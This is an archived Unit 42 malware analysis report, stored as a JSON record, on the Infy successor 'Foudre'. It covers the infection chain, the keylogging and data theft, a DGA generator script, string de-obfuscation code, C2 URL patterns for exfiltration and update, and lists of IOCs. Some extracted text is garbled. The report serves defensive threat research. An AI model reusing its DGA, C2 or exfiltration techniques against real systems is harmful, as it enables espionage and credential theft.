{
    "id": "4384efc2-cb64-4a9a-b7eb-b282bc4584ba",
    "created_at": "2023-01-12T15:09:48.895335Z",
    "updated_at": "2025-03-27T02:11:55.127919Z",
    "deleted_at": null,
    "sha1_hash": "7f08a16950464c5389fe6eb9c0331cb8ed1e8e72",
    "title": "2017-08-01 - Prince of Persia – Ride the Lightning- Infy returns as “Foudre”",
    "authors": "",
    "file_creation_date": "2022-05-27T21:12:13Z",
    "file_modification_date": "2022-05-27T21:12:13Z",
    "file_size": 1113576,
    "plain_text": "# Prince of Persia – Ride the Lightning: Infy returns as “Foudre”\n\n**unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/**\n\nTomer Bar, Simon Conant August 1, 2017\n\nBy [Tomer Bar and](https://unit42.paloaltonetworks.com/author/tomer-bar/) [Simon Conant](https://unit42.paloaltonetworks.com/author/simon-conant/)\n\nAugust 1, 2017 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Foudre,](https://unit42.paloaltonetworks.com/tag/foudre/) [Infy,](https://unit42.paloaltonetworks.com/tag/infy/) [Prince of Persia](https://unit42.paloaltonetworks.com/tag/prince-of-persia/)\n\n## Introduction\n\nIn February 2017, we observed an evolution of the “Infy” malware that we're calling \"Foudre\" (\"lightning\", in French). The actors appear to have\nlearned from our previous takedown and sinkholing of their Command and Control (C2) infrastructure – Foudre incorporates new anti-takeover\ntechniques in an attempt to avoid their C2 domains being sinkholed as we did in 2016.\n\n[We documented our original research into the decade-old campaign using the Infy malware in May 2016. A month after publishing that](https://blog.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\nresearch, we [detailed our takeover and sinkholing of the actor’s C2 servers. In July 2016, at Blackhat U.S., Claudio Guarnieri & Collin](https://blog.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/)\n[Anderson presented evidence that a subset of the C2 domains redirecting to our sinkhole were blocked by DNS tampering and HTTP filtering](https://www.blackhat.com/docs/us-16/materials/us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf)\nby the Telecommunication Company of Iran (AS12880), preventing Iran-domestic access to our sinkhole.\n\nBelow, we document these changes to the malware, and highlight some ongoing mistakes and how we leveraged them to learn more about\nthis campaign.\n\n## Foudre\n\nThis new version of Infy uses a window name “Foudre” for keylogging recording (Figure 1).\n\n\n-----\n\n_Figure 1 \"Foudre\" window for keylogging_\n\nThe logic and structure of Foudre is very similar to the original Infy malware. Most of the code remains the original Delphi programming, with\nan additional crypto library, and a new de-obfuscation algorithm.\n\n## Foudre’s capabilities\n\nFoudre is, like its Infy predecessors, an information stealer. It includes a keylogger, and captures clipboard contents on a ten-second cycle. It\ncollates system information including process list, installed antivirus, cookies, and other browser data.\n\nThe malware checks for internet connectivity simply by looking for an “HTTP 200” response to a connection to google.com. It includes the\nability to check for and download any updates to itself.\n\nThis “improved Infy” determines the C2 domain name using a Domain Generation Algorithm (DGA). It then validates that the C2 domain is\nauthentic. The C2 returns a signature file, which the malware decrypts and compares it with a locally-stored validation file.\n\nOnce the validity of the C2 is confirmed, stolen data is exfiltrated with a simple HTTP POST.\n\n## Infection\n\nThe initial infection vector is a classic spear-phishing email, including a self-executable attachment. When clicked, this executable installs an\nexecutable loader, a malware DLL, and a decoy readme file (very typical of Infy).\n\nFor first run, the loader calls the DLL with export D1 for setup, creating the installation folder \"%all users%\\app data\\SnailDriver V<version\nnumber>\". The loader copies itself as “config.exe”, and the DLL with random name (for example “q.d”), to this folder. The version number (for\nexample “1.49”) and DLL name vary between Foudre samples.\n\nThe loader writes itself to autostart in the registry. The DLL is loaded by rundll32.exe only after restarting, when the “lp.ini” file in the same\nfolder contains a numeric value.\n\nFoudre uses a similar mechanism as Infy to check if the computer is already infected. It checks for the existence of a specific window\n“foudre<trojan version number>” with window class “TNRRDPKE”.\n\nThe final version of the original Infy malware that we observed was 31. We have so far observed Foudre versions 1 and 2 (Figure 2).\n\n\n-----\n\n_Figure 2 \"Foudre\" version, window exists check mechanism_\n\nAlso embedded is the following German text (Figure 3):\n\n\"Sie soll Auskunft über Zschäpes Verhalten in der Untersuchungshaft geben - daran dürften auch die Opferanwälte Interesse haben.\"\n\nTranslated to English:\n\n“She is supposed to provide information about Zschaepe's behavior in the investigative detention period, which should also be of interest for\n_the victims' attorneys.”._\n\n_Figure 3 Embedded German text_\n\nBeate Zschäpe is a German right-wing extremist and an alleged member of the Neo-Nazi terror group National Socialist Underground (NSU).\n\nThe text appears to be copied verbatim from the caption to the first photograph in this news article from February 2017:\n[http://www.sueddeutsche.de/politik/nsu-prozess-zschaepes-verteidiger-will-jva-beamtin-als-zeugin-hoeren-1.3379516 (Figure 4).](http://www.sueddeutsche.de/politik/nsu-prozess-zschaepes-verteidiger-will-jva-beamtin-als-zeugin-hoeren-1.3379516)\n\n\n-----\n\n_gu e_ _e spape a t c e sou ce o e_ _bedded te t_\n\nWe saw similar embedded-text snippets in Infy samples, in German, Dutch, and English. It is unclear what the function of this embedded text\nis.\n\n## String de-obfuscation\n\n_Figure 5 String De-obfuscation function_\n\nThis Python script de-obfuscates a single string:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndef decrypt(enc_str):\nindex = 0\nxorKey_mul = 1\nxorkey = 0\ndec_str = \"\"\nfor i in range (0,len(enc_str)/2):\ntwoByte = enc_str[index:index+2]\nindex+=2\nxorkey = xorKey_mul &gt;&gt; 8\ntowByte_hex = ord(twoByte.decode('hex'))\ndec_byte = towByte_hex ^ xorkey\ndec_str+=chr(dec_byte)\ntowByte_hex+= xorKey_mul\nxorKey_mul=xorKey_mul*towByte_hex\nxorKey_mul= xorKey_mul &amp; 0xffff\nreturn dec_str\n\n\nThis IDA Python script adds comments to IDA with all clear text strings:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nimport os,sys\ndef find_function_arg(addr):\nwhile True:\naddr = idc.PrevHead(addr)\nif GetMnem(addr) == \"mov\" and \"eax\" in GetOpnd(addr, 0):\nreturn GetOperandValue(addr, 1)\nreturn \"\"\ndef get_string(addr):\nout = \"\"\ni = 200\ncnt=0\nwhile Byte(addr)&gt; 0 or Byte(addr+1)&gt;0:\nif Byte(addr) != 0:\nout += chr(Byte(addr))\naddr += 1\ncnt+=1\nif cnt==i:\nreturn None\nreturn out\nprint \"[*] Attempting to decrypt strings in malware: \"\nfor x in XrefsTo(0x009F5410, flags=0):\nref = find_function_arg(x.frm)\nstring = get_string(ref)\nif string is not None:\ndec = decrypt(string)\nprint \"Ref Addr: 0x%x | Decrypted: %s\" % (x.frm, dec)\nelse:\nprint \"Ref Addr: 0x%x is None\" % (x.frm)\nMakeComm(x.frm, dec)\nMakeComm(ref, dec)\n\n\n## C2 Defense\n\nLearning from our takedown of the actor’s previous C2 infrastructure, this version implements two new C2 mechanisms in an attempt to avoid\nC2 takeover.\n\nThey are now using DGA for C2 domains. They have also implemented an RSA signature verifying algorithm to check the veracity of a C2\ndomain.\n\n## Domain Generation Algorithm\n\nThe domain name is calculated using this algorithm:\n\n1 ToHex(CRC32(\"NRV1\" + year + month + week_number)) + (\".space\"|\".net\"|\".top\")[\n\n(Thanks to Palo Alto Networks researcher Esmid idrizovic for reversing this). The following script can be used to generate domain names using\nthis algorithm:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nimport binascii\nimport datetime\n\ndef getHostCRC(input):\ncrc = binascii.crc32(input) &amp; 0xffffffff\nhost = \"{:08x}\".format(int(crc))\nreturn host\ndef getDomains(date):\ndomains = [\".space\"]\nresults = []\nweeknumber = date.isocalendar()[1]\ns = \"NRV1{}{}{}\".format(date.year, date.month, weeknumber)\nhostname = s\nhost = getHostCRC(hostname) + domains[0]\nresults.append(host)\nfor d in domains:\nfor i in range(1, 101):\nhostname = s + str(i)\nhost = getHostCRC(hostname) + d\nresults.append(host)\nreturn results\n\ngetDomainsForNextWeeks(number_of_weeks):\ndate = datetime.datetime.now()\ndate -= datetime.timedelta(days=7)\nn = 1\ndate_to = date + datetime.timedelta(days=7*number_of_weeks)\nprint \"Generating domains for: {} - {}.\\nEach domain can have .space, .net or .top as TLD (top level domain).\\n\\n\".format(date,\ndate_to)\n\nfor i in range(number_of_weeks):\ntmp = getDomains(date)\ntop_domains = tmp[:20]\nweeknumber = date.isocalendar()[1]\nprint \"{}. {} - Week Number: {}\".format(n, date, weeknumber)\nfor domain in top_domains:\nprint \"{}\".format(domain)\ndate += datetime.timedelta(days=7)\nn = n + 1\nprint \"\"\ngetDomainsForNextWeeks(10)[\n\n\n-----\n\n_Figure 6 CRC32 code in the DGA algorithm_\n\nPrevious and current C2 domains are detailed in Appendix I. All point at the same C2 server on 198.252.108[.]158, located in Canada, using\nDNS servers ns1.2daa46f1[.]space and ns2.2daa46f1[.]space.\n\nThe DNS RNAME is henry55.iname[.]com, though we were not able to find any other reference to this email address outside of the context of\nthis campaign.\n\n## C2 signature verification\n\nFoudre uses the lockbox3 Delphi library to verify the C2:\n\n1. Download signature file from the generated domain name C2 with GET request:\n\nGET /de/?d=2017149&t=2017%2D5%2D29%2D%2D12%2D16%2D33\n\nd= {year}{number of days since the beginning of the year}\n\nt = Current time, urlencoded.\n2. Save the signature in %appdata%\\sig.tmp.\n3. Write the clear text string\n\n{domainname}{year}{number of days since the beginning of the year}\nin %appdata%\\dom.tmp.\n\nThe current date is downloaded from http://feeds.skynews[.]com/feeds/rss/home.xml <lastBuildDate> field.\n4. Decrypt the signature file with the public key (stored in %all users%\\application data\\snailDriver V<version>\\pub.key)\n5. Compare the result with the dom.tmp clear text string.\n\n\n-----\n\n_Figure 7 Download Signature Verification_\n\nAfter the domain is verified, it checks if a new trojan update version is needed with these posts:\n\n[http://<C2domain>/2014/?c=<computername>&u=<username>&v=<version>&s=<password>&f=<folder>&mi=<machineguid_urlencoded>&b=](http://%3Cc2domain%3E/)\n<32/64bit>&t=<time_urlencoded>\n\n[http://<C2domain>/2015/?c=<computername>&u=<username>&v=<version>&s=<password>&f=<folder>&mi=<machineguid_urlencoded>&b=](http://%3Cc2domain%3E/)\n<32/64bit>&t=<time_urlencoded>\n\nThe first request (2014 folder) downloads any new trojan version to %temp%\\gtsdch32.tmp. The second request (2015 folder) downloads a\nsecond signature file to %temp%\\gtsdci32.tmp.\n\nThe malware then performs a second RSA signature verification using the public key. If the verification is successful, the new trojan version\n(gtsdch32.tmp) is executed with this command line:\n\ngtsdch32.tmp -sp/set -pRBA4b5a98Q\n\nWe observed a very similar command structure in the original Infy malware:\n\"sp/ins -pBA5a88E\".\n\nOne of the update parameters (download and execute) contains references indicating that there is also a 64bit version of Foudre.\n\nWe also found that the request <C2>/f/?d=<filename> is redirected to <C2>/f/<filename>.tmp. This parameter is not supported by the agent, so\nit is likely a server-side redirection used by the update mechanism.\n\nThe malware then encrypts the keylogger data and system information, and sends to the C2 with this post:\n\nhttp://<C2>/en/d=<date> text=<data>\n\n\n-----\n\n## app g t e ct s\n\nWe forecast one of the DGA domain names and registered it before the adversary.\n\nThe victims attempted to connect to a C2 on that domain, but without the RSA private key we could not verify our domain to them. However,\nwe are able to map the victim locations using GeoIP (Figure 8).\n\nWe note a preponderance of Iranian-domestic victims, very reminiscent of the Infy campaigns. Efforts against the United States and Iraq are\nalso familiar. And once again, the very small number of targets hints at a non-financial motivation.\n\nOne of the Iraq victims uses an IP in the same class C network as one of an observed Infy victim, suggesting that the adversary is targeting\nthe same specific organization, or even computer.\n\n_Figure 8 Geographic spread of victims_\n\nAlthough without the RSA private key, we were unable to establish communications with any victims, we discovered that by sending an invalid\nsignature file to the victim, owing to a lack of input validation of the signature file content/size, we can crash the rundll32 process running the\nFoudre malicious DLL, disabling the infection until the victim reboots.\n\n## Conclusion\n\nIn our [Prince of Persia blog, we noted that this campaign had been active for at least a decade. We followed up with our Prince of Persia:](https://blog.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\nGame Over blog, documenting our takedown and sinkholing of the adversary’s C2 infrastructure.\n\n\n-----\n\nega d g t e act o s by t e e eco u cat o Co pa y o a to p e e t t e C s o eso g to ou s o e, Gua e & de so\n[note “The filtering policy indicates that Iranian authorities had specifically intervened to block access to the command and control domains of a](https://www.blackhat.com/docs/us-16/materials/us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf)\n_state aligned intrusion campaign at a country level”._\n\nWe shouldn’t be surprised then to see Infy return – fundamentally the same malware, targeting the same victims.\n\nThe actors understand that they needed a more robust C2 infrastructure to prevent infiltration and takedown. DGA adds some resilience, but is\nnot impervious to takeover.\n\nHowever, using digital signing is an effective C2 defense mechanism. Without access to the private keys, it’s not possible to impersonate a C2\neven if a DGA domain is registered by a researcher. It’s possible that the private keys are held locally on the C2 server, but without access to\nthe C2 we can’t confirm this particular potential vulnerability in their infrastructure.\n\nPrince of Persia is persistent, indeed.\n\n## Coverage\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n1. WildFire accurately identifies all malware samples related to this operation as malicious.\n2. Traps prevents this threat on endpoints, based upon WildFire prevention.\n3. Domains used by this operation have been flagged as malicious in Threat Prevention.\n\nAutoFocus users can view malware related to this attack using the “Foudre” tag.\n\nIOCs can be found in the appendices of this report.\n\n## Appendix I – C2 infrastructure IoCs\n\nAs of time of publishing, the actor had registered DGA domains corresponding to dates through end-July 2017. Although the DGA algorithm\nallows the Top-Level Domains (TLDs) of “.space”, ”.net” and “.top”, we note predominantly “.space” domain registrations, just one “.top”, and no\n“.net”. Of special interest is multiple “.site” domains resolving to the C2 IP address. We suspect that this may be different malware – possibly,\nas we saw with the previous Prince of Persia investigations, an as-yet unidentified more full-featured Infy/Foudre variant.\n\nns1.2daa46f1[.]space\n\nns2.2daa46f1[.]space\n\n017eab31[.]space\n\n01ead12b[.]space\n\n0ca0453a[.]site\n\n14c7e2dc[.]space\n\n15bb747b[.]site\n\n15ce27c5[.]site\n\n16e53040[.]space\n\n17ecf559[.]site\n\n1cb3c4c0[.]space\n\n1d4ee030[.]space\n\n23dafa1e[.]space\n\n2daa46f1[.]space\n\n341a436d[.]space\n\n3828b6ed[.]site\n\n39451f31[.]space\n\n3a6e08b4[.]site\n\n3c6e6571[.]space\n\n\n-----\n\n3e8 8c3[ ]s te\n\n3f4572f4[.]site\n\n431d73fb[.]space\n\n43ec206d[.]top\n\n4b6955e7[.]space\n\n4e422fa7[.]space\n\n4f2f867b[.]site\n\n5aad7667[.]space\n\n60ebc5cf[.]site\n\n61e200d6[.]space\n\n62c91753[.]site\n\n63c0d24a[.]space\n\n6bb4f456[.]space\n\n76ede1bd[.]space\n\n7ba775ac[.]site\n\n8447b18a[.]space\n\n869182ff[.]site\n\n884efdfb[.]space\n\n8cc7767f[.]site\n\n8dceb366[.]space\n\n8ee5a4e3[.]site\n\n8fec61fa[.]space\n\n9155ccba[.]space\n\n9877fa8b[.]space\n\n98e38091[.]space\n\n9c1f58ab[.]site\n\n9f233843[.]space\n\na20af0d2[.]space\n\na367590e[.]site\n\na4a55efc[.]space\n\na64c234e[.]site\n\nb4a3174b[.]space\n\nc4c9e3c4[.]space\n\nc5aeee9c[.]site\n\nd14b13d8[.]site\n\nd260045d[.]space\n\nd3a26e6a[.]space\n\n\n-----\n\nd 606998[ ]s te\n\nd50dc044[.]space\n\nd74b7e1d[.]space\n\ne00dc810[.]space\n\ne652fc2c[.]space\n\neb18683d[.]site\n\nf196b269[.]site\n\nf8eb516c[.]space\n\nf9e29475[.]site\n\nfac983f0[.]space\n\nfbc046e9[.]site\n\n198.252.108[.]158 Hawkhost Canada – Dedicated hosting (all current resolutions malicious).\n\nNote that we identified several other IP addresses historically related to some of these domains, but research concludes that these are\nregistrar-default hosts rather than C2 servers.\n\n## Appendix II – Hashes\n\n2b37ce9e31625d8b9e51b88418d4bf38ed28c77d98ca59a09daab01be36d405a\n4d51a0ea4ecc62456295873ff135e4d94d5899c4de749621bafcedbf4417c472\n\n7ce2c5111e3560aa6036f98b48ceafe83aa1ac3d3b33392835316c859970f8bc\n\n7e73a727dc8f3c48e58468c3fd0a193a027d085f25fa274a6e187cf503f01f74\n\nda228831089c56743d1fbc8ef156c672017cdf46a322d847a270b9907def53a5\n\n6bc9f6ac2f6688ed63baa29913eaf8c64738cf19933d974d25a0c26b7d01b9ac\n\n7c6206eaf0c5c9c6c8d8586a626b49575942572c51458575e51cba72ba2096a4\n\ndb605d501d3a5ca2b0e3d8296d552fbbf048ee831be21efca407c45bf794b109\n\n## Appendix III – RSA signature verifying\n\nReplicating the malicious c2 server domain 39451f31[.]space:\n\n**dom file:**\n\n39451f31.space2017138\n\n**sig file:**\n\n089EABE330EFD99602C164E889B44E16B8284BB1834A29F16C4BE8CE52FF507F9592E541DBEF85F3C15312583057CB1151B4027C22FB9\n\n**public key**\n\n4E0A4C6F636B426F783301000000030001000015DEAED84DB7C292D7DEB01D5EB8DBE40A289736E9050B60E11DF90AAEEA6D1504D1D5\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-01 - Prince of Persia – Ride the Lightning- Infy returns as “Foudre”.pdf"
    ],
    "report_names": [
        "2017-08-01 - Prince of Persia – Ride the Lightning- Infy returns as “Foudre”.pdf"
    ],
    "threat_actors": [
        {
            "id": "59c9f31b-e032-44b9-bf3b-4f2cb3d17e39",
            "created_at": "2022-10-25T16:07:23.734244Z",
            "updated_at": "2025-03-27T02:02:09.952685Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "APT-C-07",
                "Infy",
                "Operation Mermaid",
                "Prince of Persia"
            ],
            "source_name": "ETDA:Infy",
            "tools": [
                "Foudre",
                "Infy",
                "Tonnerre"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f763fd1f-f697-40eb-a082-df6fd3d13cb1",
            "created_at": "2023-01-06T13:46:38.561288Z",
            "updated_at": "2025-03-27T02:00:02.861874Z",
            "deleted_at": null,
            "main_name": "Infy",
            "aliases": [
                "Operation Mermaid",
                "Prince of Persia",
                "Foudre"
            ],
            "source_name": "MISPGALAXY:Infy",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536188,
    "ts_updated_at": 1743041515,
    "ts_creation_date": 1653685933,
    "ts_modification_date": 1653685933,
    "files": {
        "pdf": "https://archive.orkl.eu/7f08a16950464c5389fe6eb9c0331cb8ed1e8e72.pdf",
        "text": "https://archive.orkl.eu/7f08a16950464c5389fe6eb9c0331cb8ed1e8e72.txt",
        "img": "https://archive.orkl.eu/7f08a16950464c5389fe6eb9c0331cb8ed1e8e72.jpg"
    }
}